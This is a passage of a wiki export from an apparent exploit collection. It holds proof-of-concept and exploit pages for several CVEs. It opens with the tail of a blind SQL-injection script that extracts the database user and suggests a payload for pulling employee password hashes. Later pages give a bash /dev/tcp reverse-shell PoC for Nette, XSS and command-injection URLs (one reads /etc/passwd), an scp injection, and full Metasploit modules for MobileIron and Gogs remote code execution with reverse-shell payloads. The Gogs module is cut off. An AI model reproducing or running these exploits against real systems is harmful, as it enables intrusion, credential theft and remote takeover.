"form[step1][features][1][custom_value][1]": '', "form[step1][id_manufacturer]": "1", "show_variations": "0", "form[step6][reference]": "demo_1", "form[step1][qty_0_shortcut]": "0", "form[step1][price_shortcut]": "23.900000", "form[step1][price_ttc_shortcut]": "23.9", "form[step2][id_tax_rules_group]": "1", "form[step1][id_category_default]": "4", "form[step1][categories][tree][]": "2", "form[step1][categories][tree][]": "3", "form[step1][categories][tree][]": "4", "ignore": "4", "form[step1][new_category][name]": '', "form[step1][new_category][id_parent]": "2", "form[step3][qty_0]": "0", "form[step3][minimal_quantity]": "1", "form[step3][location]": "TEST", "form[step3][low_stock_threshold]": '', "form[step3][virtual_product][is_virtual_file]": "0", "form[step3][virtual_product][name]": '', "form[step3][virtual_product][nb_downloadable]": '', "form[step3][virtual_product][expiration_date]": '', "form[step3][virtual_product][nb_days]": "0", "form[step3][pack_stock_type]": "3", "form[step3][attributes]": '', "product_combination_bulk[quantity]": '', "product_combination_bulk[cost_price]": '', "product_combination_bulk[impact_on_weight]": '', "product_combination_bulk[impact_on_price_te]": '', "product_combination_bulk[impact_on_price_ti]": '', "product_combination_bulk[date_availability]": '', "product_combination_bulk[reference]": '', "product_combination_bulk[minimal_quantity]": '', "product_combination_bulk[low_stock_threshold]": '', "product_combination_bulk[_token]": "0Dj8tJ3zd6YfSNgyxRFe6CfNbuMac6mn8rm_Gd52-to", "form[step3][out_of_stock]": "2", "form[step3][available_now][1]": '', "form[step3][available_later][1]": '', "form[step3][available_date]": '', "form[step4][width]": "0", "form[step4][height]": "0", "form[step4][depth]": "0", "form[step4][weight]": "0", "form[step4][additional_delivery_times]": "1", "form[step4][delivery_in_stock][1]": '', "form[step4][delivery_out_stock][1]": '', "form[step4][additional_shipping_cost]": "0.000000", "form[step2][price]": "23.900000", "form[step2][price_ttc]": "23.9", "form[step2][unit_price]": "0.000000", "form[step2][unity]": '', "form[step2][ecotax]": "0.000000", "form[step2][id_tax_rules_group]": "1", "form[step2][wholesale_price]": "0.000000", "form[step2][specific_price][sp_id_shop]": "1", "form[step2][specific_price][sp_id_currency]": '', "form[step2][specific_price][sp_id_country]": '', "form[step2][specific_price][sp_id_group]": '', "form[step2][specific_price][sp_id_product_attribute]": '', "form[step2][specific_price][sp_from]": '', "form[step2][specific_price][sp_to]": '', "form[step2][specific_price][sp_from_quantity]": "1", "form[step2][specific_price][leave_bprice]": "1", "form[step2][specific_price][sp_reduction]": "0.000000", "form[step2][specific_price][sp_reduction_type]": "amount", "form[step2][specific_price][sp_reduction_tax]": "1", "form[step2][specificPricePriority_0]": "id_shop", "form[step2][specificPricePriority_1]": "id_currency", "form[step2][specificPricePriority_2]": "id_country", "form[step2][specificPricePriority_3]": "id_group", "form[step5][meta_title][1]": '', "form[step5][meta_description][1]": '', "form[step5][link_rewrite][1]": "hummingbird-printed-t-shirt", "form[step5][redirect_type]": "301-category", "form[step6][visibility]": "both", "form[step6][display_options][available_for_order]": "1", "form[step6][display_options][show_price]": "1", "form[step6][tags][1]": '', "form[step6][condition]": "new", "form[step6][isbn]": '', "form[step6][ean13]": '', "form[step6][upc]": '', "form[step6][attachment_product][name]": '', "form[step6][attachment_product][description]": '', "form[id_product]": "1", "form[_token]": "4KtBNSbjc--GLbsVr__-wqC5Qw2hQKDXh6zb8vWKBwA", "form[step1][active]": "1"}
        data["form[_token]"] = form_token
        data["form[step3][location]"] = sql_payload
        data["form[id_product]"] = product_id
        # print(sql_payload)
        r = s.post(url, headers=headers, data=data)
        
        if(productDetails_form_location(s,target,token,product_id,admin_path) == "1"):
            return j
    return None


for i in range(1,41):
    payload = "0'|(ascii(substr(user(),%d,1)) regexp [CHAR])#" % i 
    extracted_char = chr(sqli(s,token,form_token,payload,target,product_id,admin_path))
    sys.stdout.write(extracted_char)
    sys.stdout.flush()
print("\n(+) done!")

#PAYLOAD TO EXTRACT PASSWORD: 
# payload:  0'|ascii((substr((select passwd from ps_employee),1,1)) regexp [CHAR]#)
&lt;/pre&gt;</text>
      <sha1>0tfkij2xmv4nef5c2070iacie18xs6y</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-15227 remote code execution vulnerability</title>
    <ns>0</ns>
    <id>15</id>
    <revision>
      <id>25</id>
      <timestamp>2021-02-26T09:46:34Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>建立內容為「==Affected version:== Nette versions before 2.0.19, 2.1.13, 2.2.10, 2.3.14, 2.4.16, 3.0.6   ==POC:== &lt;code&gt;/nette.micro?callback=shell_exec&amp;cmd=bash%20-i%20&gt;&amp;%20/…」的新頁面</comment>
      <origin>25</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="200" sha1="g09if8vncs9qvvsgwv7mfallvyb58kf" xml:space="preserve">==Affected version:==
Nette versions before 2.0.19, 2.1.13, 2.2.10, 2.3.14, 2.4.16, 3.0.6 

==POC:==
&lt;code&gt;/nette.micro?callback=shell_exec&amp;cmd=bash%20-i%20&gt;&amp;%20/dev/tcp/'+lhost+'/'+lport+'0&gt;&amp;1&lt;/code&gt;</text>
      <sha1>g09if8vncs9qvvsgwv7mfallvyb58kf</sha1>
    </revision>
    <revision>
      <id>26</id>
      <parentid>25</parentid>
      <timestamp>2021-02-26T09:47:34Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>26</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="214" sha1="5cnqrtstdmbky9vjavvphlo58ufehqv" xml:space="preserve">[[en:page]]


==Affected version:==
Nette versions before 2.0.19, 2.1.13, 2.2.10, 2.3.14, 2.4.16, 3.0.6 

==POC:==
&lt;code&gt;/nette.micro?callback=shell_exec&amp;cmd=bash%20-i%20&gt;&amp;%20/dev/tcp/'+lhost+'/'+lport+'0&gt;&amp;1&lt;/code&gt;</text>
      <sha1>5cnqrtstdmbky9vjavvphlo58ufehqv</sha1>
    </revision>
    <revision>
      <id>33</id>
      <parentid>26</parentid>
      <timestamp>2021-02-26T11:03:27Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>33</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="375" sha1="5vipwdb5x8nqasihnar801zv7bklpde" xml:space="preserve">{{Translated page|中文（普通繁體）|https://www.pwnwiki.org/index.php?title=CVE-2020-15227_%E9%81%A0%E7%A8%8B%E4%BB%A3%E7%A2%BC%E5%9F%B7%E8%A1%8C%E6%BC%8F%E6%B4%9E}}


==Affected version:==
Nette versions before 2.0.19, 2.1.13, 2.2.10, 2.3.14, 2.4.16, 3.0.6 

==POC:==
&lt;code&gt;/nette.micro?callback=shell_exec&amp;cmd=bash%20-i%20&gt;&amp;%20/dev/tcp/'+lhost+'/'+lport+'0&gt;&amp;1&lt;/code&gt;</text>
      <sha1>5vipwdb5x8nqasihnar801zv7bklpde</sha1>
    </revision>
    <revision>
      <id>35</id>
      <parentid>33</parentid>
      <timestamp>2021-02-26T11:31:24Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>35</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="203" sha1="4eefvz0rkva4tv46gbs8fyyg7mqkmqv" xml:space="preserve">


==Affected version:==
Nette versions before 2.0.19, 2.1.13, 2.2.10, 2.3.14, 2.4.16, 3.0.6 

==POC:==
&lt;code&gt;/nette.micro?callback=shell_exec&amp;cmd=bash%20-i%20&gt;&amp;%20/dev/tcp/'+lhost+'/'+lport+'0&gt;&amp;1&lt;/code&gt;</text>
      <sha1>4eefvz0rkva4tv46gbs8fyyg7mqkmqv</sha1>
    </revision>
    <revision>
      <id>51</id>
      <parentid>35</parentid>
      <timestamp>2021-02-27T12:41:25Z</timestamp>
      <contributor>
        <ip>45.155.225.253</ip>
      </contributor>
      <comment>清空全部內容</comment>
      <origin>51</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="0" sha1="phoiac9h4m842xq45sp7s6u21eteeq1" xml:space="preserve" />
      <sha1>phoiac9h4m842xq45sp7s6u21eteeq1</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-15227 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>6</id>
    <revision>
      <id>10</id>
      <timestamp>2021-02-26T06:37:12Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>建立內容為「==影響版本：== Nette versions before 2.0.19, 2.1.13, 2.2.10, 2.3.14, 2.4.16, 3.0.6  ==POC：== &lt;code&gt; /nette.micro?callback=shell_exec&amp;cmd=bash%20-i%20&gt;&amp;%20/…」的新頁面</comment>
      <origin>10</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="200" sha1="2ve9f3zf3he8bdzvoh1qb3inyzrcwcr" xml:space="preserve">==影響版本：==
Nette versions before 2.0.19, 2.1.13, 2.2.10, 2.3.14, 2.4.16, 3.0.6

==POC：==
&lt;code&gt; /nette.micro?callback=shell_exec&amp;cmd=bash%20-i%20&gt;&amp;%20/dev/tcp/'+lhost+'/'+lport+'0&gt;&amp;1&lt;/code&gt;</text>
      <sha1>2ve9f3zf3he8bdzvoh1qb3inyzrcwcr</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-15261 Veyon 4.4.1 - 'VeyonService' Unquoted Service Path</title>
    <ns>0</ns>
    <id>3331</id>
    <revision>
      <id>3889</id>
      <timestamp>2021-06-02T01:15:19Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Veyon 4.4.1 - 'VeyonService' Unquoted Service Path # Discovery by: Víctor García # Discovery Date: 2020-03-23 # Vendor Homepage: https://veyon..."</comment>
      <origin>3889</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1534" sha1="s50flwkeeau4cafm2b1yhrffg6p1gs8" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Veyon 4.4.1 - 'VeyonService' Unquoted Service Path
# Discovery by: Víctor García
# Discovery Date: 2020-03-23
# Vendor Homepage: https://veyon.io/
# Software Link: https://github.com/veyon/veyon/releases/download/v4.4.1/veyon-4.4.1.0-win64-setup.exe
# Tested Version: 4.4.1
# Vulnerability Type: Unquoted Service Path
# Tested on: Windows 10 Pro x64
# CVE: CVE-2020-15261

# Step to discover Unquoted Service Path:

C:\&gt;wmic service get name,displayname,pathname,startmode |findstr /i
"auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
Veyon Service     VeyonService     C:\Program Files\Veyon\veyon-service.exe


# Service info:

C:\&gt;sc qc VeyonService
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: VeyonService
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Veyon\veyon-service.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Veyon Service
        DEPENDENCIES       : Tcpip
                           : RpcSs
        SERVICE_START_NAME : LocalSystem


# Exploit:

# A successful attempt would require the local user to be able to insert their code in the
# system root path undetected by the OS or other security applications where it could
# potentially be executed during application startup or reboot. If successful, the local
# user's code would execute with the elevated privileges of the application.
&lt;/pre&gt;</text>
      <sha1>s50flwkeeau4cafm2b1yhrffg6p1gs8</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-15500 Tileserver-gl 3.0.0 XSS漏洞</title>
    <ns>0</ns>
    <id>1354</id>
    <revision>
      <id>1695</id>
      <timestamp>2021-04-15T13:32:10Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==XSS== &lt;pre&gt; http://example.com/?key="&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt; &lt;/pre&gt;"</comment>
      <origin>1695</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="86" sha1="6l7gfvmq1pq2z5jn3a0i0txqjukgily" xml:space="preserve">==XSS==
&lt;pre&gt;
http://example.com/?key="&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
&lt;/pre&gt;</text>
      <sha1>6l7gfvmq1pq2z5jn3a0i0txqjukgily</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-15505 MobileIron MDM Hessian-Based Java 反序列化遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>3227</id>
    <revision>
      <id>3765</id>
      <timestamp>2021-05-31T04:01:03Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule..."</comment>
      <origin>3765</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4499" sha1="oe9xw00p76q8cno3f4f3ncnrrmiv9sx" xml:space="preserve">==EXP==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Remote

  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' =&gt; 'MobileIron MDM Hessian-Based Java Deserialization RCE',
        'Description' =&gt; %q{
          This module exploits an ACL bypass in MobileIron MDM products to
          execute a Groovy gadget against a Hessian-based Java deserialization
          endpoint.
        },
        'Author' =&gt; [
          'Orange Tsai', # Discovery
          'rootxharsh', # Exploit
          'iamnoooob', # Exploit
          'wvu' # Module
        ],
        'References' =&gt; [
          ['CVE', '2020-15505'],
          ['URL', 'https://www.mobileiron.com/en/blog/mobileiron-security-updates-available'],
          ['URL', 'https://blog.orange.tw/2020/09/how-i-hacked-facebook-again-mobileiron-mdm-rce.html'],
          ['URL', 'https://github.com/httpvoid/CVE-Reverse/tree/master/CVE-2020-15505']
        ],
        'DisclosureDate' =&gt; '2020-09-12', # Public disclosure
        'License' =&gt; MSF_LICENSE,
        'Platform' =&gt; ['unix', 'linux'],
        'Arch' =&gt; [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Privileged' =&gt; false,
        'Targets' =&gt; [
          [
            'Unix Command',
            {
              'Platform' =&gt; 'unix',
              'Arch' =&gt; ARCH_CMD,
              'Type' =&gt; :unix_cmd,
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'cmd/unix/reverse_python_ssl'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' =&gt; 'linux',
              'Arch' =&gt; [ARCH_X86, ARCH_X64],
              'Type' =&gt; :linux_dropper,
              'DefaultOptions' =&gt; {
                'CMDSTAGER::FLAVOR' =&gt; :bourne,
                'PAYLOAD' =&gt; 'linux/x64/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' =&gt; 0,
        'DefaultOptions' =&gt; {
          'SSL' =&gt; true
        },
        'Notes' =&gt; {
          'Stability' =&gt; [CRASH_SAFE],
          'Reliability' =&gt; [REPEATABLE_SESSION],
          'SideEffects' =&gt; [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      Opt::RPORT(443),
      OptString.new('TARGETURI', [true, 'Base path', '/'])
    ])
  end

  def check
    # http://hessian.caucho.com/doc/hessian-1.0-spec.xtp#Call
    res = send_request_hessian('c')

    unless res
      return CheckCode::Unknown('Target did not respond to check.')
    end

    unless res.code == 200 &amp;&amp; res.headers['Content-Type'] == 'application/x-hessian'
      return CheckCode::Safe('ACL bypass failed.')
    end

    CheckCode::Vulnerable('ACL bypass successful.')
  end

  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")

    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager
    end
  end

  def execute_command(cmd, _opts = {})
    vprint_status("Executing command: #{cmd}")

    send_request_hessian(groovy_gadget(cmd))
  end

  def send_request_hessian(data)
    send_request_cgi(
      'method' =&gt; 'POST',
      'uri' =&gt; normalize_uri(target_uri.path, '/mifs/.;/services/LogService'),
      'ctype' =&gt; 'x-application/hessian',
      'headers' =&gt; {
        'Referer' =&gt; rand_text_english(8..42)
      },
      'data' =&gt; data
    )
  end

  def groovy_gadget(cmd)
    # http://hessian.caucho.com/doc/hessian-1.0-spec.xtp#Headers
    hessian = "c\x01\x00H\x00\x08#{rand_text_english(8)}"

    # Cale hates me for this
    hessian &lt;&lt; Rex::Text.zlib_inflate(Rex::Text.decode_base64(
      &lt;&lt;~HESSIAN
        eNpFj01PwkAQhkcRBUz8CBe9cfVg+Q3YYDBKIS7h4mnbju2S3W4zuy20v95BQS6bfXffPPPM
        3APMPQwzsrZugsorHUx3pSxSK+Ae/25LsiWSV+i4CgJ6uXR5aFPk+GQpCxK+57JywQFDVeGV
        wWCOPrdpqK2rCAVcmt8soOu8JC/gltBZXaPwJD1mzRvAnt9PFWHiVY2Hh0cjd8pUJqpMjLT4
        XkqSzEJyh0IvRY0ZM9joYSNrGWhZZAGLJ+jcS6V0iiRgSPiHnhJZ4qkozauAq8Qaw4uuNcM6
        nMexKsYuF3D+nLDlbBK+j1az6Wj5MYmmq/bf0FITCbjGolZkC4OF59g/DnERN7t2WyB9MvhC
        wMDnyi3iDX9y8aY8rrFqSnRrD3dfJ/dQS+f2QsCUTpxso7Zt95yz09EOfgCmKo1k
      HESSIAN
    ))

    hessian.sub("\x00\x0fHACK THE PLANET", "#{[cmd.length].pack('n')}#{cmd}")
  end

end

&lt;/pre&gt;</text>
      <sha1>oe9xw00p76q8cno3f4f3ncnrrmiv9sx</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-15568 TerraMaster TOS exportUser.php 遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>3730</id>
    <revision>
      <id>4326</id>
      <timestamp>2021-06-09T06:36:20Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; &lt;pre&gt; TerraMaster TOS &lt; 4.1.24 &lt;/pre&gt;  ==FOFA== &lt;pre&gt; "TerraMaster" &amp;&amp; header="TOS" &lt;/pre&gt;  &lt;translate&gt; ==漏洞利用=..."</comment>
      <origin>4326</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="936" sha1="lodfbgmizc4az8yopo9751da2nrr8t9" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
&lt;pre&gt;
TerraMaster TOS &lt; 4.1.24
&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
"TerraMaster" &amp;&amp; header="TOS"
&lt;/pre&gt;

&lt;translate&gt;
==漏洞利用==
&lt;/translate&gt;

&lt;translate&gt;
在其他文件的代碼檢查期間，也發現有一種方法可以利用TOS軟件中預先存在的類來利用此問題。位於&lt;code&gt;include/class/application.class.php&lt;/code&gt;中的PHP類是在運行TOS軟件的設備上執行命令的最佳人選。

由於exportUser.php沒有身份驗證控件，因此未經身份驗證的攻擊者有可能通過提供以下值作為HTTP GET參數來實現代碼執行。
&lt;/translate&gt;

&lt;pre&gt;
http://xxx.xxx.xxx.xxx/include/exportUser.php?type=3&amp;cla=application&amp;func=_exec&amp;opt=(cat%20/etc/passwd)&gt;test.txt
&lt;/pre&gt;


&lt;translate&gt;
返回200後再次訪問
&lt;/translate&gt;
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/include/test.txt
&lt;/pre&gt;


&lt;translate&gt;
==參考==
&lt;/translate&gt;
https://short.pwnwiki.org/?c=0s3FRY</text>
      <sha1>lodfbgmizc4az8yopo9751da2nrr8t9</sha1>
    </revision>
    <revision>
      <id>4327</id>
      <parentid>4326</parentid>
      <timestamp>2021-06-09T06:36:50Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>4327</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1002" sha1="8k41mxl9tlc16ukf9iw9ma0smypra08" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
TerraMaster TOS &lt; 4.1.24
&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
"TerraMaster" &amp;&amp; header="TOS"
&lt;/pre&gt;

&lt;translate&gt;
==漏洞利用== &lt;!--T:2--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:3--&gt;
在其他文件的代碼檢查期間，也發現有一種方法可以利用TOS軟件中預先存在的類來利用此問題。位於&lt;code&gt;include/class/application.class.php&lt;/code&gt;中的PHP類是在運行TOS軟件的設備上執行命令的最佳人選。

&lt;!--T:4--&gt;
由於exportUser.php沒有身份驗證控件，因此未經身份驗證的攻擊者有可能通過提供以下值作為HTTP GET參數來實現代碼執行。
&lt;/translate&gt;

&lt;pre&gt;
http://xxx.xxx.xxx.xxx/include/exportUser.php?type=3&amp;cla=application&amp;func=_exec&amp;opt=(cat%20/etc/passwd)&gt;test.txt
&lt;/pre&gt;


&lt;translate&gt;
&lt;!--T:5--&gt;
返回200後再次訪問
&lt;/translate&gt;
&lt;pre&gt;
http://xxx.xxx.xxx.xxx/include/test.txt
&lt;/pre&gt;


&lt;translate&gt;
==參考== &lt;!--T:6--&gt;
&lt;/translate&gt;
https://short.pwnwiki.org/?c=0s3FRY</text>
      <sha1>8k41mxl9tlc16ukf9iw9ma0smypra08</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-15778 Openssh命令注入漏洞</title>
    <ns>0</ns>
    <id>4</id>
    <revision>
      <id>6</id>
      <timestamp>2021-02-26T06:29:35Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>建立內容為「=CVE-2020-15778 Openssh命令注入漏洞=  ==影響版本：== Openssh&lt;=8.3p1  ==利用方法：== &lt;code&gt;scp / hello.txt root@192.168.1.113:'`touch /root/pwn.sh`…」的新頁面</comment>
      <origin>6</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="266" sha1="5kwfn0t5u7ps4tgqgws8q71v3jg4crr" xml:space="preserve">=CVE-2020-15778 Openssh命令注入漏洞=

==影響版本：==
Openssh&lt;=8.3p1

==利用方法：==
&lt;code&gt;scp / hello.txt root@192.168.1.113:'`touch /root/pwn.sh`/root'&lt;/code&gt;&lt;br&gt;

傳輸hello.txt到/root目錄下，並且執行命令 &lt;code&gt;touch /root/pwn.sh&lt;/code&gt;</text>
      <sha1>5kwfn0t5u7ps4tgqgws8q71v3jg4crr</sha1>
    </revision>
    <revision>
      <id>15</id>
      <parentid>6</parentid>
      <timestamp>2021-02-26T07:06:11Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>/* CVE-2020-15778 Openssh命令注入漏洞 */</comment>
      <origin>15</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="224" sha1="35nh832p5w8tkuesf6ot1xyjwg7dp6b" xml:space="preserve">

==影響版本：==
Openssh&lt;=8.3p1

==利用方法：==
&lt;code&gt;scp / hello.txt root@192.168.1.113:'`touch /root/pwn.sh`/root'&lt;/code&gt;&lt;br&gt;

傳輸hello.txt到/root目錄下，並且執行命令 &lt;code&gt;touch /root/pwn.sh&lt;/code&gt;</text>
      <sha1>35nh832p5w8tkuesf6ot1xyjwg7dp6b</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-15867 Gogs Git Hooks 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1187</id>
    <revision>
      <id>1490</id>
      <timestamp>2021-04-10T13:25:08Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##   class MetasploitModul..."</comment>
      <origin>1490</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="11233" sha1="dx4poahbeksgx0n9r3r5gms4wgx9vw7" xml:space="preserve">==EXP==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule &lt; Msf::Exploit::Remote
 
  Rank = ExcellentRanking
 
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
 
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' =&gt; 'Gogs Git Hooks Remote Code Execution',
        'Description' =&gt; %q{
          This module leverages an insecure setting to get remote code
          execution on the target OS in the context of the user running Gogs.
          This is possible when the current user is allowed to create `git
          hooks`, which is the default for administrative users. For
          non-administrative users, the permission needs to be specifically
          granted by an administrator.
 
          To achieve code execution, the module authenticates to the Gogs web
          interface, creates a temporary repository, sets a `post-receive` git
          hook with the payload and creates a dummy file in the repository.
          This last action will trigger the git hook and execute the payload.
          Everything is done through the web interface.
 
          No mitigation has been implemented so far (latest stable version is
          0.12.3).
 
          This module has been tested successfully against version 0.12.3 on
          docker. Windows version could not be tested since the git hook feature
          seems to be broken.
        },
        'Author' =&gt; [
          'Podalirius',             # Original PoC
          'Christophe De La Fuente' # MSF Module
        ],
        'References' =&gt; [
          ['CVE', '2020-15867'],
          ['EDB', '49571'],
          ['URL', 'https://podalirius.net/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/'],
          ['URL', 'https://www.fzi.de/en/news/news/detail-en/artikel/fsa-2020-3-schwachstelle-in-gitea-1126-und-gogs-0122-ermoeglicht-ausfuehrung-von-code-nach-authent/']
        ],
        'DisclosureDate' =&gt; '2020-10-07',
        'License' =&gt; MSF_LICENSE,
        'Platform' =&gt; %w[unix linux win],
        'Arch' =&gt; [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Privileged' =&gt; false,
        'Targets' =&gt; [
          [
            'Unix Command',
            {
              'Platform' =&gt; 'unix',
              'Arch' =&gt; ARCH_CMD,
              'Type' =&gt; :unix_cmd,
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'cmd/unix/reverse_bash'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' =&gt; 'linux',
              'Arch' =&gt; [ARCH_X86, ARCH_X64],
              'Type' =&gt; :linux_dropper,
              'DefaultOptions' =&gt; {
                'CMDSTAGER::FLAVOR' =&gt; :bourne,
                'PAYLOAD' =&gt; 'linux/x64/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Windows Command',
            {
              'Platform' =&gt; 'win',
              'Arch' =&gt; ARCH_CMD,
              'Type' =&gt; :win_cmd,
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'cmd/windows/powershell_reverse_tcp'
              }
            }
          ],
          [
            'Windows Dropper',
            {
              'Platform' =&gt; 'win',
              'Arch' =&gt; [ARCH_X86, ARCH_X64],
              'Type' =&gt; :win_dropper,
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'windows/x64/meterpreter/reverse_tcp'
              }
            }
          ],
        ],
        'DefaultOptions' =&gt; { 'WfsDelay' =&gt; 30 },
        'DefaultTarget' =&gt; 1,
        'Notes' =&gt; {
          'Stability' =&gt; [CRASH_SAFE],
          'Reliability' =&gt; [REPEATABLE_SESSION]
        }
      )
    )
 
    register_options([
      Opt::RPORT(3000),
      OptString.new('TARGETURI', [true, 'Base path', '/']),
      OptString.new('USERNAME', [true, 'Username to authenticate with']),
      OptString.new('PASSWORD', [true, 'Password to use']),
    ])
 
    @need_cleanup = false
  end
 
  def check
    res = send_request_cgi(
      'method' =&gt; 'GET',
      'uri' =&gt; normalize_uri(target_uri.path)
    )
    unless res
      return CheckCode::Unknown('Target did not respond to check.')
    end
 
    # &lt;meta name="author" content="Gogs" /&gt;
    unless res.body.match(%r{&lt;meta +name="author" +content="Gogs" */&gt;})
      return CheckCode::Unsupported('Target does not appear to be running Gogs.')
    end
 
    CheckCode::Appears('Gogs found')
  end
 
  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
 
    print_status("Authenticate with \"#{datastore['USERNAME']}/#{datastore['PASSWORD']}\"")
    gogs_login
    print_good('Logged in')
 
    @repo_name = [Faker::App.name, Faker::App.name].join('_').gsub(' ', '_')
    print_status("Create repository \"#{@repo_name}\"")
    gogs_create_repo
    @need_cleanup = true
    print_good('Repository created')
 
    case target['Type']
    when :unix_cmd, :win_cmd
      execute_command(payload.encoded)
    when :linux_dropper, :win_dropper
      execute_cmdstager(background: true, delay: 1)
    end
  end
 
  def execute_command(cmd, _opts = {})
    vprint_status("Executing command: #{cmd}")
 
    print_status('Setup post-receive hook with command')
    gogs_post_receive_hook(cmd)
    print_good('Git hook setup')
 
    print_status('Create a dummy file on the repo to trigger the payload')
    last_chunk = cmd_list ? cmd == cmd_list.last : true
    gogs_create_file(last_chunk: last_chunk)
    print_good("File created#{', shell incoming...' if last_chunk}")
  end
 
  def http_post_request(uri, opts = {})
    csrf = opts.delete(:csrf) || get_csrf(uri)
    timeout = opts.delete(:timeout) || 20
 
    post_data = { _csrf: csrf }.merge(opts)
    request_hash = {
      'method' =&gt; 'POST',
      'uri' =&gt; normalize_uri(datastore['TARGETURI'], uri),
      'ctype' =&gt; 'application/x-www-form-urlencoded',
      'vars_post' =&gt; post_data
    }
 
    send_request_cgi(request_hash, timeout)
